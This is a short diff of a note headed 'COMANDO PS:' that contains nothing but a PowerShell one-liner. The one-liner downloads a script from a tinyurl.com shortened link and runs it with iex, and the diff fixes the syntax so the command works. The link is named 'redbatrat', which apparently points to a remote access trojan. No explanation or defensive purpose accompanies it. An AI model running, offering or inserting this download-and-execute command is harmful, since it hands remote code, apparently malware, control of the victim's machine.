@@ -1,3 +1,3 @@
 COMANDO PS: 
 
-iex(wget'https://tinyurl.com/redbatrat').content
+iex (iwr 'https://tinyurl.com/redbatrat').Content
